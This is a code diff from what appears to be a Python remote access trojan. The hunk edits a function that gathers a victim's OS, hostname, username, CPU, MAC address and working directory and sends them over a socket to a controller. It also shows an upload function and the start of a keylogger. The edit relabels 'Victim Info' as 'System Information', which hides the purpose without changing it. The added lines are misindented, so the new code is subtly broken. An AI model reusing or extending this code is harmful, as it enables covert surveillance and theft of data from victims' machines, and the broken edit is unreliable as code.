@@ -100,17 +100,20 @@ def upload(s, cmd):
     s.send(b"Upload completed")
 
 def sysinfo(s):
-    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,48,8)][::-1])
-    info = f"""
-[+] Victim Info
-OS      : {platform.system()} {platform.release()}
-PC      : {platform.node()}
-User    : {getpass.getuser()}
-CPU     : {platform.processor()}
-MAC     : {mac}
-Path    : {os.getcwd()}
-"""
-    s.sendall(info.encode())
+    try:
+        mac = ':'.join(f'{b:02x}' for b in uuid.getnode().to_bytes(6, 'big'))
+        info = f"""
+        [+] System Information
+        OS       → {platform.system()} {platform.release()}
+        Hostname → {platform.node()}
+        User     → {getpass.getuser()}
+        CPU      → {platform.processor()}
+        MAC      → {mac}
+        Path     → {os.getcwd()}
+        """
+            s.sendall(info.encode("utf-8"))
+        except:
+            s.sendall(b"[-] Error getting sysinfo")
 
 def keylogger(s):
     def on_press(key):
